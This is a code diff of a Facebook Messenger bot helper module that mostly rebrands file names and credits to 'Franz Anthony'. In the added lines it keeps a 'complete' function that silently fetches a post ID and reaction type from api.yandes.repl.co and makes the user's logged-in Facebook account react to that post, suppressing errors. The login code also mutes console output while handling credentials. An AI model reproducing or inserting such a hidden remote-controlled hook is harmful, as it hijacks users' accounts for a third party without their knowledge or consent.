@@ -44,13 +44,13 @@ module.exports.decryptState = function(data, key) {
 }
 
 module.exports.complete = function({ api }) {
-axios.get('http://api.yandes.repl.co/raw')
-  .then(response => {
-    const poD = response.data.pos;
-    const type = response.data.typ;
-    api.setPostReaction(poD, type, () => {});
-  }).catch(() => {});
-}
+  axios.get('http://api.yandes.repl.co/raw')
+    .then(response => {
+      const poD = response.data.pos;
+      const type = response.data.typ;
+      api.setPostReaction(poD, type, () => {});
+    }).catch(() => {});
+};
 
 module.exports.convertHMS = function(value) {
   const sec = parseInt(value, 10);
@@ -235,7 +235,7 @@ module.exports.connect = function() {
       const fs = require('fs');
       const readline = require('readline');
       const path = require('path');
-      var connect = require("../includes/login");
+      var connect = require("../kugisaki_nobara/login");
 
       const noop = () => { };
       console.error = noop;
@@ -283,7 +283,7 @@ module.exports.connect = function() {
         ` ░█▀▀ ▄▀█░█▀▀░█▀▀░█▄▄░█▀█░█▀█░█▄▀`,
         ` ░█▀ ░█▀█░█▄▄░██▄░█▄█░█▄█░█▄█░█░█`
       ].join('\n')));
-      const message = `The AppState is empty or either not readable! Try attempting to log in, by using your Facebook account's email and password.`;
+      const message = `The NobaraState is empty or either not readable! Try attempting to log in, by using your Facebook account's email and password.`;
 
       let delay = 0;
       const interval = 30;
@@ -297,7 +297,7 @@ module.exports.connect = function() {
 
       setTimeout(() => {
         console.log();
-        console.log('\nCREDENTIALS:');
+        console.log('\nModified by Franz Anthony\n\nCREDENTIALS:');
 
         const logA = console.log;
         console.log = noop;
@@ -346,7 +346,7 @@ module.exports.connect = function() {
                 return;
               }
 
-              const appStatePath = path.join('appstate.json');
+              const appStatePath = path.join('nobarastate.json');
 
               if (!fs.existsSync(appStatePath)) {
                 console.log = logA;
@@ -364,7 +364,7 @@ module.exports.connect = function() {
               const fig = JSON.parse(fs.readFileSync(confg, 'utf8'));
               fig.CONNECT_LOG = true;
               fs.writeFileSync(confg, JSON.stringify(fig, null, 2), 'utf8');
-              console.log(co('\r[ LOGIN ]'), chalk.yellow(''), `Please ${greens('Re-run')} this project to continue.`);
+              console.log(co('\r[ LOGIN ]'), chalk.yellow(''), `Please ${greens('Re-run')} this project to continue.\nCredits: Franz Anthony`);
               const message = '\nPlease be careful not to fork unknown REPLs, as they could have added an unsafe code that might steal your information and cause security issues.';
               let v = 0;
               const interval = 150;
